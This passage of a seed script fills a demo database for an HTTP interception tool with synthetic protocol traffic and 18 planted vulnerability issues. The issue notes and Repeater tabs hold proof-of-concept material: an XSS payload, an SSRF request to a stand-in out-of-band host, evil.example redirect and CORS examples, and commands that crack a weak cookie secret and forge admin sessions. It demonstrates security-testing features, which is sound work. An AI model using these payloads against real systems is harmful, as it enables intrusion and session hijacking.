  {"in", mqtt_packet(0xd0_u8, Bytes.new(0))},  # PINGRESP
].each { |(dir, payload)| store.insert_ws_message(ids[:mqtt], dir, 2, payload) }

# GraphQL over a WebSocket — how every real SUBSCRIPTION runs, and the one GraphQL shape
# that has no request body to decode: the document travels INSIDE a frame, wrapped in the
# subprotocol's envelope. Opening this flow offers a GRAPHQL pane built from the transcript
# (`Gori::GraphqlWs`), which the three POST /graphql flows above cannot exercise.
gql_ws_req, gql_ws_resp = ws_heads("api.demo.test", "/graphql", subprotocol: "graphql-transport-ws")
ids[:gql_ws] = raw_flow(store, t.call(133), host: "api.demo.test", method: "GET", target: "/graphql",
  req_head: gql_ws_req, status: 101, reason: "Switching Protocols", resp_head: gql_ws_resp,
  dur_us: 6_200_000_i64)

[
  {"out", 1, %({"type":"connection_init","payload":{"Authorization":"Bearer #{jwt}"}})},
  {"in", 1, %({"type":"connection_ack"})},
  {"out", 1, %({"id":"1","type":"subscribe","payload":{"operationName":"OnOrder","query":"subscription OnOrder($cartId: ID!) { orderUpdated(cartId: $cartId) { id status total } }","variables":{"cartId":"9"}}})},
  {"in", 1, %({"id":"1","type":"next","payload":{"data":{"orderUpdated":{"id":"9","status":"paid","total":3998}}}})},
  {"in", 1, %({"id":"1","type":"next","payload":{"data":{"orderUpdated":{"id":"9","status":"shipped","total":3998}}}})},
  {"out", 1, %({"type":"ping"})},
  {"in", 1, %({"type":"pong"})},
  # A second subscription, on the ADMIN field a customer token should not reach — it is
  # accepted, which is the same authorization gap the REST IDOR shows, one transport over.
  {"out", 1, %({"id":"2","type":"subscribe","payload":{"query":"subscription { auditLog { actor action target } }"}})},
  {"in", 1, %({"id":"2","type":"next","payload":{"data":{"auditLog":{"actor":"bob@demo.test","action":"role.grant","target":"user:2"}}}})},
  {"out", 1, %({"id":"1","type":"complete"})},
].each { |(dir, op, payload)| store.insert_ws_message(ids[:gql_ws], dir, op, payload.to_slice) }

# --- gRPC: the calls that are not a happy unary 200 -------------------------
# One h2 connection carrying TWO streams, so the FRAMES pane shows the surrounding
# multiplexed traffic with `*` marking the stream the open flow belongs to — the frames
# below are interleaved on purpose, the way they arrive on the wire.
grpc_conn = store.insert_h2_connection("api.demo.test", 443, "h2")

watch_msgs = [
  grpc_frame(pb_message(pb_string_field(1, "BW-0042"), pb_varint_field(2, 1999))),
  grpc_frame(pb_message(pb_string_field(1, "RW-0043"), pb_varint_field(2, 2499))),
  grpc_frame(pb_message(pb_string_field(1, "BW-0042"), pb_varint_field(2, 1899))),
  grpc_frame(pb_message(pb_string_field(1, "GW-0044"), pb_varint_field(2, 3299))),
]
watch_body = IO::Memory.new
watch_msgs.each { |m| watch_body.write(m) }
watch_req_msg = grpc_frame(pb_message(pb_string_field(1, "shop"), pb_varint_field(2, 4)))
stats_req_msg = grpc_frame(pb_string_field(1, "2026-06"))

store.insert_h2_frame(grpc_conn, "out", 0x4_u8, 0x0_u8, 0_u32, Bytes[0x00, 0x03, 0x00, 0x00, 0x00, 0x64])
store.insert_h2_frame(grpc_conn, "out", 0x1_u8, 0x4_u8, 1_u32,
  Bytes[0x82, 0x87, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x07])
store.insert_h2_frame(grpc_conn, "out", 0x0_u8, 0x1_u8, 1_u32, watch_req_msg)
store.insert_h2_frame(grpc_conn, "out", 0x1_u8, 0x4_u8, 3_u32,
  Bytes[0x82, 0x87, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x11])
store.insert_h2_frame(grpc_conn, "in", 0x1_u8, 0x4_u8, 1_u32,
  Bytes[0x88, 0x5f, 0x10, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e])
store.insert_h2_frame(grpc_conn, "out", 0x0_u8, 0x1_u8, 3_u32, stats_req_msg)
watch_msgs.each { |m| store.insert_h2_frame(grpc_conn, "in", 0x0_u8, 0x0_u8, 1_u32, m) }
store.insert_h2_frame(grpc_conn, "in", 0x1_u8, 0x4_u8, 3_u32, Bytes[0x88, 0x5f, 0x10, 0x61, 0x70, 0x70])
# stream 3's whole answer IS its trailers: grpc-status 7 = PERMISSION_DENIED, so there is no
# DATA frame at all — a gRPC failure that a status-code reader would call a 200.
store.insert_h2_frame(grpc_conn, "in", 0x1_u8, 0x5_u8, 3_u32,
  Bytes[0x40, 0x0b, 0x67, 0x72, 0x70, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x01, 0x37])
store.insert_h2_frame(grpc_conn, "in", 0x1_u8, 0x5_u8, 1_u32,
  Bytes[0x40, 0x0b, 0x67, 0x72, 0x70, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0x01, 0x30])
store.flush

grpc_head = ->(path : String, extra : String) {
  String.build do |b|
    b << "POST " << path << " HTTP/2\r\n"
    b << "Host: api.demo.test\r\n"
    b << "content-type: application/grpc+proto\r\n"
    b << "te: trailers\r\n"
    b << "grpc-encoding: identity\r\n"
    b << "grpc-accept-encoding: identity,gzip\r\n"
    b << "authorization: Bearer " << jwt << "\r\n"
    b << extra
    b << "user-agent: grpc-demo/1.0 grpc-crystal/0.3\r\n\r\n"
  end
}

# SERVER STREAMING: one request, four messages back on one stream. The body deframes into
# four length-prefixed protobuf messages, each with a string AND a varint field, so the
# schema-less tree the pane draws has more than one row shape in it.
ids[:grpc_stream] = raw_flow(store, t.call(135), host: "api.demo.test", method: "POST",
  target: "/demo.Prices/Watch", http: "HTTP/2",
  req_head: grpc_head.call("/demo.Prices/Watch", "grpc-timeout: 30S\r\n"), req_body: watch_req_msg,
  status: 200, ctype: "application/grpc+proto",
  resp_head: "HTTP/2 200\r\ncontent-type: application/grpc+proto\r\ngrpc-status: 0\r\ngrpc-message: OK\r\n" \
             "X-Gori-Trailers: grpc-status, grpc-message\r\n\r\n",
  resp_body: watch_body.to_slice, dur_us: 7_300_000_i64,
  h2_conn_id: grpc_conn, h2_stream_id: 1_i64)

# A gRPC call that FAILED at the application layer while succeeding at the HTTP one: 200 OK,
# empty body, and the real answer in the trailers. `X-Gori-Trailers` names the fields that
# arrived in the trailing HEADERS block rather than the response head — without that line a
# trailer is indistinguishable from a header, and for gRPC the trailer IS the status.
ids[:grpc_denied] = raw_flow(store, t.call(136), host: "api.demo.test", method: "POST",
  target: "/demo.Admin/GetStats", http: "HTTP/2",
  req_head: grpc_head.call("/demo.Admin/GetStats", ""), req_body: stats_req_msg,
  status: 200, ctype: "application/grpc+proto",
  resp_head: "HTTP/2 200\r\ncontent-type: application/grpc+proto\r\ngrpc-status: 7\r\n" \
             "grpc-message: caller is not an administrator\r\n" \
             "X-Gori-Trailers: grpc-status, grpc-message\r\n\r\n",
  dur_us: 51_000_i64, h2_conn_id: grpc_conn, h2_stream_id: 3_i64)

# A gRPC call answered by a PROXY, not the service: `text/html` 502, no framing at all. The
# response content-type says HTML, and this is still a gRPC call in the PROTO column and
# under `proto:grpc` — because the REQUEST said `application/grpc`, and that is the set an
# operator hunting broken gRPC routes is looking through.
gateway_html = "<html><head><title>502 Bad Gateway</title></head><body><center><h1>502 Bad Gateway</h1></center>" \
               "<hr><center>nginx/1.25.3</center></body></html>\n"
ids[:grpc_502] = raw_flow(store, t.call(137), host: "api.demo.test", method: "POST",
  target: "/demo.Greeter/SayHello", http: "HTTP/2",
  req_head: grpc_head.call("/demo.Greeter/SayHello", ""), req_body: grpc_frame(pb_string_field(1, "alice")),
  status: 502, ctype: "text/html",
  resp_head: "HTTP/2 502\r\nserver: nginx/1.25.3\r\ncontent-type: text/html\r\n" \
             "content-length: #{gateway_html.bytesize}\r\n\r\n",
  resp_body: gateway_html.to_slice, dur_us: 84_000_i64)

# CLEARTEXT gRPC (h2c, prior knowledge) to an internal service on the legacy box — the row
# the PROTO column prints as `GRPC` and not `GRPCS`. An admin RPC, unauthenticated, over a
# plaintext connection: exactly the pair of facts the transport-bearing label exists to make
# visible on the triage line.
h2c_req = String.build do |b|
  b << "POST /demo.Legacy/ListUsers HTTP/2\r\n"
  b << "Host: legacy.demo.test:8081\r\n"
  b << "content-type: application/grpc\r\n"
  b << "te: trailers\r\n"
  b << "user-agent: grpc-demo/1.0\r\n\r\n"
end
h2c_body = IO::Memory.new
h2c_body.write(grpc_frame(pb_message(pb_varint_field(1, 1), pb_string_field(2, "alice@demo.test"))))
h2c_body.write(grpc_frame(pb_message(pb_varint_field(1, 2), pb_string_field(2, "bob@demo.test"))))
ids[:grpc_h2c] = raw_flow(store, t.call(139), scheme: "http", host: "legacy.demo.test", port: 8081,
  method: "POST", target: "/demo.Legacy/ListUsers", http: "HTTP/2",
  req_head: h2c_req, req_body: grpc_frame(pb_varint_field(1, 50)),
  status: 200, ctype: "application/grpc",
  resp_head: "HTTP/2 200\r\ncontent-type: application/grpc\r\ngrpc-status: 0\r\n" \
             "X-Gori-Trailers: grpc-status\r\n\r\n",
  resp_body: h2c_body.to_slice, dur_us: 23_000_i64)

# grpc-web-text: the browser-facing variant, over HTTP/1.1, with the WHOLE framed stream
# base64-encoded — scanning the raw body for a length prefix finds base64 characters and
# reports nothing, so the deframer has to decode first. Its trailers ride INSIDE the body as
# a 0x80-flagged frame of ASCII header lines, which is the other half of the same feature:
# the pane prints them as `▸ trailer` instead of trying to read them as protobuf.
web_stream = IO::Memory.new
web_stream.write(grpc_frame(pb_message(pb_string_field(1, "Hello, alice!"), pb_varint_field(2, 2))))
web_stream.write(grpc_frame("grpc-status: 0\r\ngrpc-message: OK\r\n".to_slice, trailer: true))
web_body = Base64.strict_encode(web_stream.to_slice)
web_req_body = Base64.strict_encode(grpc_frame(pb_string_field(1, "alice")))
web_req = String.build do |b|
  b << "POST /demo.Greeter/SayHello HTTP/1.1\r\n"
  b << "Host: api.demo.test\r\n"
  b << "Content-Type: application/grpc-web-text\r\n"
  b << "X-Grpc-Web: 1\r\n"
  b << "Accept: application/grpc-web-text\r\n"
  b << "Origin: https://shop.demo.test\r\n"
  b << "Content-Length: " << web_req_body.bytesize << "\r\n\r\n"
end
ids[:grpc_web] = raw_flow(store, t.call(141), host: "api.demo.test", method: "POST",
  target: "/demo.Greeter/SayHello", req_head: web_req, req_body: web_req_body.to_slice,
  status: 200, reason: "OK", ctype: "application/grpc-web-text",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/grpc-web-text\r\n" \
             "Access-Control-Expose-Headers: grpc-status,grpc-message\r\n" \
             "Content-Length: #{web_body.bytesize}\r\n\r\n",
  resp_body: web_body.to_slice, dur_us: 39_000_i64)

# A stream cut mid-frame: the last length prefix declares 96 bytes and 8 arrived. The bytes
# that could NOT be framed are the finding in a parser test, so the pane frames what it can
# and says the rest is short rather than silently dropping it.
cut = IO::Memory.new
cut.write(grpc_frame(pb_message(pb_string_field(1, "BW-0042"), pb_varint_field(2, 1999))))
cut.write(Bytes[0x00, 0x00, 0x00, 0x00, 0x60]) # declares 96 bytes…
cut.write(pb_string_field(1, "GW-004"))        # …8 arrive, then the connection died
raw_flow(store, t.call(143), host: "api.demo.test", method: "POST",
  target: "/demo.Prices/Watch", http: "HTTP/2",
  req_head: grpc_head.call("/demo.Prices/Watch", ""), req_body: watch_req_msg,
  status: 200, ctype: "application/grpc+proto",
  resp_head: "HTTP/2 200\r\ncontent-type: application/grpc+proto\r\n\r\n",
  resp_body: cut.to_slice, dur_us: 2_050_000_i64,
  state: S::FlowState::Aborted, error: "connection closed mid-response")

# --- SSE, the other two ways it goes -----------------------------------------
# CLEARTEXT SSE (`SSE`, not `SSES`) from the legacy box, with the fields the price stream
# above does not have: a multi-line `data:` (the parser joins the lines), an event with no
# `event:` type at all, and a stream that opens with a comment keepalive.
legacy_sse = <<-SSE
  : connected

  data: {"level":"info","msg":"worker started"}

  event: job
  id: 41
  data: {"id":41,"state":"running"}
  data: {"queue":"exports","attempt":1}

  event: job
  id: 42
  data: {"id":42,"state":"failed","error":"SMTP timeout after 30s"}

  : keepalive

  SSE
raw_flow(store, t.call(145), scheme: "http", host: "legacy.demo.test", port: 8080,
  method: "GET", target: "/internal/events",
  req_head: "GET /internal/events HTTP/1.1\r\nHost: legacy.demo.test:8080\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Accept: text/event-stream\r\nAuthorization: Basic ZGVtbzptZXRyaWNzLXB3\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/event-stream",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: text/event-stream\r\n" \
             "Cache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n",
  resp_body: legacy_sse.to_slice, dur_us: 12_600_000_i64)

# An SSE stream the origin dropped mid-event: the last `data:` line has no terminating blank
# line, so the final event never completed. State Aborted, and the row reads ERR in History
# while still classifying as SSE — the content-type landed, the stream did not.
raw_flow(store, t.call(147), host: "api.demo.test", method: "GET", target: "/v1/stream/orders",
  req_head: "GET /v1/stream/orders HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Accept: text/event-stream\r\nAuthorization: Bearer #{jwt}\r\nLast-Event-ID: 17\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/event-stream",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: text/event-stream; charset=utf-8\r\n" \
             "Cache-Control: no-cache\r\n\r\n",
  resp_body: ("event: order\nid: 18\ndata: {\"id\":10,\"status\":\"paid\"}\n\n" \
              "event: order\nid: 19\ndata: {\"id\":11,\"stat").to_slice,
  dur_us: 31_400_000_i64,
  state: S::FlowState::Aborted, error: "connection closed mid-response")

# --- HTTP itself, in the shapes the happy path skips ------------------------
# A response gori WROTE: the short-circuit rewriter rule seeded below matched and no origin
# was ever dialed. The PROTO column prints `STUB` in place of HTTP/HTTPS, because a
# fabricated response must not look like an ordinary row while scrolling (#511).
stub_js = "console.log('demo shop boot — served by gori');\nwindow.API='https://api.demo.test/v1';\n"
raw_flow(store, t.call(149), host: "cdn.demo.test", method: "GET", target: "/assets/app.min.js",
  req_head: "GET /assets/app.min.js HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Accept: */*\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/javascript",
  resp_head: "HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\n" \
             "Content-Length: #{stub_js.bytesize}\r\nX-Gori-Stub: match-and-replace\r\n\r\n",
  resp_body: stub_js.to_slice, dur_us: 300_i64, short_circuited: true)

# gzip'd AND chunked — the two layers the display has to undo in order (RFC 9112 §6.1 puts
# the transfer coding outside the content coding). Storage keeps the wire bytes; the detail
# pane says "de-chunked · decoded: gzip" over the JSON it recovered.
gz_json = %({"orders":[{"id":9,"total":3998,"items":2},{"id":10,"total":1999,"items":1}],"page":1,"pages":4})
gz_body = chunked_bytes(gzip_bytes(gz_json))
raw_flow(store, t.call(151), host: "api.demo.test", method: "GET", target: "/v1/orders?page=1",
  req_head: "GET /v1/orders?page=1 HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Accept-Encoding: gzip, deflate, br\r\nAuthorization: Bearer #{jwt}\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/json",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n" \
             "Content-Encoding: gzip\r\nTransfer-Encoding: chunked\r\nVary: Accept-Encoding\r\n\r\n",
  resp_body: gz_body, dur_us: 66_000_i64)

# A plaintext forward-proxy request: captured ABSOLUTE-form, because that is the wire truth
# — the request line really did carry the scheme and authority (P7). Every surface that
# builds a URL from a row has to notice and NOT double the host onto it.
raw_flow(store, t.call(153), scheme: "http", host: "legacy.demo.test", port: 80,
  method: "GET", target: "http://legacy.demo.test/status",
  req_head: "GET http://legacy.demo.test/status HTTP/1.1\r\nHost: legacy.demo.test\r\n" \
            "User-Agent: curl/8.6.0\r\nProxy-Connection: Keep-Alive\r\nAccept: */*\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_head: "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\nContent-Type: text/plain\r\n" \
             "Content-Length: 3\r\n\r\n",
  resp_body: "OK\n".to_slice, dur_us: 12_000_i64)

# HTTP/1.0, no keep-alive, no Host requirement honoured on the way back — the old box still
# answers this way, and the version column has something other than 1.1/2 in it.
raw_flow(store, t.call(154), scheme: "http", host: "legacy.demo.test", port: 8080,
  method: "GET", target: "/cgi-bin/status.cgi", http: "HTTP/1.0",
  req_head: "GET /cgi-bin/status.cgi HTTP/1.0\r\nHost: legacy.demo.test:8080\r\nUser-Agent: gori-demo/1.0\r\n\r\n",
  status: 200, reason: "OK", ctype: "text/plain",
  resp_head: "HTTP/1.0 200 OK\r\nServer: thttpd/2.25b\r\nContent-Type: text/plain\r\nConnection: close\r\n\r\n",
  resp_body: "uptime 41d\nload 0.42 0.31 0.28\n".to_slice, dur_us: 44_000_i64)

# HEAD: a response that declares a body it will never send. The pane has to show the head
# and nothing else, and the SIZE column has to mean the bytes that ACTUALLY arrived.
raw_flow(store, t.call(155), host: "cdn.demo.test", method: "HEAD", target: "/assets/app.js",
  req_head: "HEAD /assets/app.js HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/javascript",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/javascript\r\n" \
             "Content-Length: 84\r\nETag: \"6a43cf48-54\"\r\n\r\n", dur_us: 9_000_i64)

# 304: the conditional request the browser really sends on every reload. No body by
# definition, and the row exists to prove the cache round trip happened.
raw_flow(store, t.call(156), host: "cdn.demo.test", method: "GET", target: "/assets/app.js",
  req_head: "GET /assets/app.js HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "If-None-Match: \"6a43cf48-54\"\r\nIf-Modified-Since: Thu, 19 Jun 2026 09:00:00 GMT\r\n\r\n",
  status: 304, reason: "Not Modified",
  resp_head: "HTTP/1.1 304 Not Modified\r\nServer: nginx/1.25.3\r\nETag: \"6a43cf48-54\"\r\n\r\n",
  dur_us: 6_000_i64)

# No response at all — the upstream refused the connection. `FlowMapper.error_response`
# records status 0 with an EMPTY head and a message, so History shows ERR with the reason
# and the SIZE column reads "—" rather than a misleading 0B (P4/P7: the failure is captured,
# not swallowed).
raw_flow(store, t.call(158), host: "internal.demo.test", method: "GET", target: "/admin/health",
  req_head: "GET /admin/health HTTP/1.1\r\nHost: internal.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Accept: */*\r\n\r\n",
  status: 0, resp_head: "", dur_us: 2_010_000_i64,
  state: S::FlowState::Error, error: "upstream connect: connection refused (10.0.4.19:443)")

raw_flow(store, t.call(159), host: "expired.demo.test", method: "GET", target: "/",
  req_head: "GET / HTTP/1.1\r\nHost: expired.demo.test\r\nUser-Agent: gori-demo/1.0\r\nAccept: */*\r\n\r\n",
  status: 0, resp_head: "", dur_us: 340_000_i64,
  state: S::FlowState::Error, error: "tls handshake: certificate has expired")

store.flush
puts "• inserted act-three protocol variety: 4 sockets (ws:// · h2 CONNECT · mqtt · graphql-ws), " \
     "1 connect-udp tunnel, 6 grpc (stream/denied/502/h2c/grpc-web/cut), 2 sse, " \
     "stub + gzip-chunked + absolute-form + 1.0 + HEAD + 304 + 2 errors"

# --- Issues (a few planted vulns, linked to the flows above) ----------------
f1 = store.insert_issue("Reflected XSS in /search `q` parameter", S::Severity::High,
  "shop.demo.test", ids[:xss])
store.update_issue(f1, notes: "The `q` query parameter is reflected into the HTML " \
                              "response without output encoding.\n\nPoC: /search?q=<script>alert(1)</script>\n\n" \
                              "Impact: session theft via document.cookie (token is also exposed in the login JSON — see related issue).\n" \
                              "Fix: HTML-encode user input on output; add a CSP.", status: S::Status::Confirmed)

f2 = store.insert_issue("IDOR: /v1/users/{id} exposes other users' PII", S::Severity::High,
  "api.demo.test", ids[:idor])
store.update_issue(f2, notes: "A customer token (user_id=1) can read /v1/users/2 and " \
                              "receives Bob's email, role=admin and phone.\n\nNo object-level authorization check.\n" \
                              "Fix: verify the authenticated subject owns (or may access) the requested id.", status: S::Status::Confirmed)

f3 = store.insert_issue("Verbose 500 leaks stack trace & framework version", S::Severity::Medium,
  "api.demo.test", ids[:err500])
store.update_issue(f3, notes: "/v1/debug returns a full stack trace and 'DemoFramework 4.2.1' " \
                              "in the response body. Aids targeted exploitation.\nFix: disable debug error pages in production.")

f4 = store.insert_issue("Session token returned in JSON body", S::Severity::Low,
  "shop.demo.test", ids[:login])
store.update_issue(f4, notes: "POST /api/login returns the bearer token in the JSON body in " \
                              "addition to the Set-Cookie. JS-readable tokens are exfiltratable via the XSS above.\n" \
                              "Fix: keep the session in an HttpOnly, Secure cookie only.")

store.insert_issue("Inconsistent authz: /v1/orders 401 but /v1/cart open", S::Severity::Info,
  "api.demo.test", ids[:cart])

f6 = store.insert_issue("GraphQL introspection enabled in production", S::Severity::Medium,
  "api.demo.test", ids[:gql])
store.update_issue(f6, notes: "POST /graphql answers a full `__schema` introspection query for " \
                              "anonymous clients, exposing the entire type system (queries, mutations, types).\n\n" \
                              "Impact: accelerates API mapping and discovery of hidden/abusable mutations.\n" \
                              "Fix: disable introspection in production, or gate it behind authentication.")

f7 = store.insert_issue("Blind SSRF in /v1/import `url` (confirmed via OAST)", S::Severity::High,
  "api.demo.test", ids[:ssrf])
store.update_issue(f7, notes: "POST /v1/import fetches an operator-supplied URL server-side. The response " \
                              "is generic success, so it's blind — confirmed OUT OF BAND: the OAST tab received a " \
                              "DNS lookup then an HTTP GET from the server for a1b2c3d4.oast.demo.test.\n\n" \
                              "PoC: {\"url\":\"https://<your-oast-host>/hook\"}\n" \
                              "Impact: reach internal services / cloud metadata (169.254.169.254).\n" \
                              "Fix: allowlist destination hosts; block link-local + private ranges.", status: S::Status::Confirmed)

f8 = store.insert_issue("JWT signed with a weak, guessable secret", S::Severity::High,
  "api.demo.test", ids[:login])
store.update_issue(f8, notes: "The HS256 session JWT is signed with the secret \"#{WEAK_SECRET}\".\n\n" \
                              "Reproduce in the JWT tab: send the login token there (Space → send selection to JWT), " \
                              "run the weak-secret attack — it recovers the key — then re-sign a forged {\"role\":\"admin\"} " \
                              "payload, or try the alg:none attack.\n" \
                              "Fix: use a long random secret (or RS256 with a rotated keypair).")

f9 = store.insert_issue("Flask session cookie signed with a weak secret", S::Severity::High,
  "legacy.demo.test", ids[:flask])
store.update_issue(f9, notes: "GET /admin/dashboard sets an itsdangerous-signed Flask cookie whose key is " \
                              "\"#{COOKIE_SECRET}\" — the same weak-secret class as the JWT, in a different format.\n\n" \
                              "Reproduce:\n" \
                              "  1. Decoder tab → `cookie-decode` (auto-detects Flask/Rack/Django) to read the payload.\n" \
                              "  2. `gori run cookie --crack --secrets #{COOKIE_SECRET},dev,changeme <cookie>` recovers the key.\n" \
                              "  3. `gori run cookie --forge --secret #{COOKIE_SECRET} '{\"user_id\":\"2\",\"role\":\"admin\"}'` mints an admin session.\n" \
                              "The Django cookie on /py/portal shares the key; the Rack one on /rb/orders uses another.\n" \
                              "Fix: a long random SECRET_KEY per environment, rotated on compromise.",
  status: S::Status::Confirmed)

f10 = store.insert_issue("CORS reflects any Origin with credentials", S::Severity::High,
  "api.demo.test", ids[:cors])
store.update_issue(f10, notes: "The preflight for /v1/cart echoes `Origin: https://evil.example` back in " \
                               "Access-Control-Allow-Origin AND sets Access-Control-Allow-Credentials: true.\n\n" \
                               "Impact: any site the victim visits can read authenticated API responses cross-origin.\n" \
                               "Fix: allowlist origins server-side; never reflect, and never pair a wildcard with credentials.",
  status: S::Status::Confirmed)

f11 = store.insert_issue("Open redirect in /go `next` parameter", S::Severity::Medium,
  "shop.demo.test", ids[:redirect])
store.update_issue(f11, notes: "GET /go?next=https://evil.example/harvest returns 302 with that exact Location.\n" \
                               "Chains with the OAuth flow above: an authorization redirect_uri that lands here " \
                               "leaks the `code`.\nFix: allowlist redirect targets, or accept only site-relative paths.")

f12 = store.insert_issue("Deployed .env readable (DB + mail credentials)", S::Severity::Critical,
  "shop.demo.test", ids[:dotenv])
store.update_issue(f12, notes: "GET /.env serves the application environment file: DB_PASSWORD, MAIL_PASSWORD and " \
                               "APP_KEY, plus APP_DEBUG=true.\n\nImpact: direct database credentials; APP_KEY forges " \
                               "signed cookies.\nFix: block dotfiles at the web server and move secrets out of the docroot.",
  status: S::Status::Confirmed)

f13 = store.insert_issue("Source map + database credentials in production bundle", S::Severity::Medium,
  "cdn.demo.test", ids[:bundle])
store.update_issue(f13, notes: "/assets/app.min.js ends with `//# sourceMappingURL=app.min.js.map` and inlines a " \
                               "postgres:// URI with the database password in it. The same file sinks `location.hash` " \
                               "into innerHTML and `eval`s a postMessage field.\n" \
                               "Fix: strip source maps from production, keep the DSN server-side, and validate the " \
                               "message origin.")

f14 = store.insert_issue("Directory listing enabled on /uploads/", S::Severity::Low,
  "shop.demo.test", ids[:listing])
store.update_issue(f14, notes: "nginx autoindex exposes /uploads/, including db-backup.sql.gz (9 MB).\n" \
                               "Fix: `autoindex off` and move backups out of the docroot.")

# One triaged the other way, so the Issues tab isn't uniformly "open": the CSV export is
# slow but that is the report job, not a defect.
f15 = store.insert_issue("Slow /v1/reports/export (8.4s) — possible DoS", S::Severity::Info,
  "api.demo.test", ids[:slow])
store.update_issue(f15, notes: "8.4s server-side. Re-measured against the staging dataset: it is the report " \
                               "job's normal cost, and the endpoint is authenticated + rate-limited.",
  status: S::Status::FalsePositive)

f16 = store.insert_issue("Basic auth over cleartext http:// on :8080", S::Severity::Medium,
  "legacy.demo.test", ids[:basic])
store.update_issue(f16, notes: "GET http://legacy.demo.test:8080/internal/metrics carries " \
                               "`Authorization: Basic ZGVtbzptZXRyaWNzLXB3` (base64 of demo:metrics-pw — decode it in " \
                               "the Decoder tab) over an unencrypted origin.\n" \
                               "Reported and fixed in the 2026-06-18 deploy; the listener now redirects to https.",
  status: S::Status::Resolved)

f17 = store.insert_issue("Session JWT sent over a CLEARTEXT WebSocket (ws://)", S::Severity::High,
  "legacy.demo.test", ids[:ws_plain])
store.update_issue(f17, notes: "ws://legacy.demo.test:8080/ws/notify carries the bearer JWT in its FIRST frame, " \
                               "in the clear — the same token /v1/* accepts.\n\n" \
                               "This is what the transport-bearing PROTO label is for: the row reads WS, not WSS, and " \
                               "the MESSAGES pane shows the token going out on frame #1.\n" \
                               "The same transcript also has the server accepting an UNMASKED client frame (RFC 6455 " \
                               "§5.1 requires masking), which is a second, independent finding on one socket.\n" \
                               "Fix: wss:// only, and reject unmasked client frames.", status: S::Status::Confirmed)

f18 = store.insert_issue("Unauthenticated gRPC admin service on cleartext h2c", S::Severity::High,
  "legacy.demo.test", ids[:grpc_h2c])
store.update_issue(f18, notes: "POST /demo.Legacy/ListUsers on legacy.demo.test:8081 answers grpc-status 0 with the " \
                               "full user list and NO credentials on the request — over h2c (prior knowledge), so the " \
                               "row is GRPC and not GRPCS.\n\n" \
                               "Compare /demo.Admin/GetStats on api.demo.test, which refuses the same class of call " \
                               "with grpc-status 7 PERMISSION_DENIED — the trailers carry the real answer while HTTP " \
                               "says 200 either way.\n" \
                               "Fix: require the bearer on the internal service, and terminate TLS in front of it.")

puts "• inserted 18 issues (open / confirmed / false-positive / resolved)"

# --- Workbench sessions (Repeater / Fuzzer / Miner) -------------------------
# Pre-seed sub-tabs so entity links have repeater/fuzz/miner targets to jump to.
xss_req = replay_req("GET", "shop.demo.test",
  "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
ids[:repeater_xss] = store.insert_repeater("https://shop.demo.test", xss_req.to_slice,
  false, true, ids[:xss], 0)
store.set_repeater_name(ids[:repeater_xss], "XSS PoC")

idor_req = replay_req("GET", "api.demo.test", "/v1/users/2",
  {"Authorization" => "Bearer #{jwt}"})
ids[:repeater_idor] = store.insert_repeater("https://api.demo.test", idor_req.to_slice,
  false, true, ids[:idor], 1)
store.set_repeater_name(ids[:repeater_idor], "IDOR probe")

ssrf_req = replay_req("POST", "api.demo.test", "/v1/import",
  {"Authorization" => "Bearer #{jwt}", "Content-Type" => "application/json"},
  %({"url":"https://a1b2c3d4.oast.demo.test/hook?from=api.demo.test"}))
ids[:repeater_ssrf] = store.insert_repeater("https://api.demo.test", ssrf_req.to_slice,
  false, true, ids[:ssrf], 2)
store.set_repeater_name(ids[:repeater_ssrf], "SSRF → OAST")

hahwul_req = "GET / HTTP/2\r\nhost: www.hahwul.com\r\naccept: text/html\r\n\r\n"
ids[:repeater_hahwul] = store.insert_repeater("https://www.hahwul.com", hahwul_req.to_slice,
  true, true, ids[:hahwul_home], 3)
store.set_repeater_name(ids[:repeater_hahwul], "hahwul home")

# A tab written in `$KEY` rather than literals: `$API` is a project env var (below) and
# `$token` is a session BINDING produced by the extract rule on /api/login. Both stay
# unexpanded in the editor and resolve at send time — that is the whole point of the
# Env/Bindings pair, and this tab is where you watch it happen (^E opens the env overlay).
bound_req = replay_req("GET", "api.demo.test", "/v1/users/1",
  {"Authorization" => "Bearer $token", "X-Client" => "$UA"})
ids[:repeater_bound] = store.insert_repeater("$API", bound_req.to_slice,
  false, true, nil, 4)
store.set_repeater_name(ids[:repeater_bound], "bound $token")
store.set_repeater_tags(ids[:repeater_bound], "bindings env")

# A WebSocket tab. A repeater is a WS session when its request bytes are an upgrade
# handshake (Repeater::WsEngine.upgrade_request?) — nothing else marks it — and the
